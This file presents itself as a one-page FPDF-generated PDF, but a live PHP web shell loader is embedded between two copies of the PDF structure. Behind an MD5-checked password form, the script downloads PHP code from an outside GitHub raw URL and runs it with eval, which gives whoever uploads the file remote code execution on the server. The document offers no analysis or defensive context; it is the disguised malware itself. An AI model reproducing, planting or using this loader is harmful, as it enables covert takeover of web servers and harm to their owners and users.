%PDF-1.3
<</Type /Page
/Parent 1 0 R
/Resources 2 0 R
/Contents 4 0 R>>
endobj
4 0 obj
<</Filter /FlateDecode /Length 65>>
stream
x�3R��2�35W(�r
Q�w3T02�30PISp
	[��Fffz�@�
M��,������B9�j7 
endstream
endobj
1 0 obj
<</Type /Pages
/Kids [3 0 R ]
/Count 1
/MediaBox [0 0 792.00 612.00]
>>
endobj
5 0 obj
<</Type /Font
/BaseFont /Helvetica-Bold
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
6 0 obj
<</Type /Font
/BaseFont /Helvetica-Oblique
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
/F2 6 0 R
>>
/XObject <<
>>
>>
endobj
7 0 obj
<<
/Producer (FPDF 1.6)
/CreationDate (D:20240312080734)
>>
endobj
8 0 obj
<<
/Type /Catalog
/Pages 1 0 R
/OpenAction [3 0 R /FitH null]
/PageLayout /OneColumn
>>
endobj
xref
0 9
0000000000 65535 f 
0000000221 00000 n 
0000000513 00000 n 
0000000009 00000 n 
0000000087 00000 n 
0000000308 00000 n 
0000000409 00000 n 
0000000627 00000 n 
0000000702 00000 n 
trailer
<<
/Size 9
/Root 8 0 R
/Info 7 0 R
>>
startxref
805
%%EOF
<?php 
session_start();
$hashedPassword = md5("23fac6d182d22ece806f28d7ba0264d4");

if (!isset($_SESSION['logged_in'])) {
    if ($_POST['password'] ?? '' && md5($_POST['password']) === $hashedPassword) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }
    echo '<form method="POST"><input type="password" name="password" placeholder="" required>
          <button type="submit">Login</button></form>';
    exit();
}
$link = 'https://raw.githubusercontent.com/bellpwn/opet/main/net360.php';
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$output = curl_exec($ch); 
curl_close($ch);      
eval ('?>'.$output);
?>
<</Type /Page
/Parent 1 0 R
/Resources 2 0 R
/Contents 4 0 R>>
endobj
4 0 obj
<</Filter /FlateDecode /Length 65>>
stream
x�3R��2�35W(�r
Q�w3T02�30PISp
	[��Fffz�@�
M��,������B9�j7 
endstream
endobj
1 0 obj
<</Type /Pages
/Kids [3 0 R ]
/Count 1
/MediaBox [0 0 792.00 612.00]
>>
endobj
5 0 obj
<</Type /Font
/BaseFont /Helvetica-Bold
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
6 0 obj
<</Type /Font
/BaseFont /Helvetica-Oblique
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
/F2 6 0 R
>>
/XObject <<
>>
>>
endobj
7 0 obj
<<
/Producer (FPDF 1.6)
/CreationDate (D:20240312080734)
>>
endobj
8 0 obj
<<
/Type /Catalog
/Pages 1 0 R
/OpenAction [3 0 R /FitH null]
/PageLayout /OneColumn
>>
endobj
xref
0 9
0000000000 65535 f 
0000000221 00000 n 
0000000513 00000 n 
0000000009 00000 n 
0000000087 00000 n 
0000000308 00000 n 
0000000409 00000 n 
0000000627 00000 n 
0000000702 00000 n 
trailer
<<
/Size 9
/Root 8 0 R
/Info 7 0 R
>>
startxref
805
%%EOF
